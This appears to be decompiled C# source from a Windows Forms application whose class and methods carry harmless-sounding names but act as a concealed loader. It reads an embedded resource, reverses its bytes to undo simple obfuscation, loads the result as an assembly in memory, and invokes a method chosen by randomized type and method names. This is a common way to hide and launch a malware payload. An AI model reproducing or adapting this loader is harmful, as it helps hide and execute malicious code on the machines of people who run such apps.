using System;
using System.Collections.Generic;
using System.Linq;
using System.Reflection;
using WindowsFormsApp48.Properties;

namespace WindowsFormsApp48;

public static class Mouse
{
	public static void App1()
	{
		if (Win32.BUFFER == null)
		{
			Win32.BUFFER = Resources.Rihxum;
		}
		else
		{
			Win32.BUFFER = null;
		}
	}

	public static void Sony()
	{
		if (Win32.METHODS == null)
		{
			Array.Reverse((Array)Win32.BUFFER, 0, Win32.BUFFER.Length);
			Win32.METHODS = new List<MethodInfo>();
		}
		Type[] exportedTypes = Assembly.Load(Win32.BUFFER).GetExportedTypes();
		foreach (Type type in exportedTypes)
		{
			Win32.METHODS.AddRange(type.GetMethods());
		}
	}

	public static void Embassy()
	{
		if (Win32.METHODS == null)
		{
			Sony();
		}
		if (Win32.METHODS.Count <= 0)
		{
			return;
		}
		foreach (MethodInfo item in Win32.METHODS.ToList())
		{
			if (item.DeclaringType!.FullName == "Xb961YVQiGSHnHDNJr.N3o2mITZACqDbyXEbO" && item.Name == "vW57WhTJr")
			{
				item.Invoke(null, null);
			}
		}
	}
}
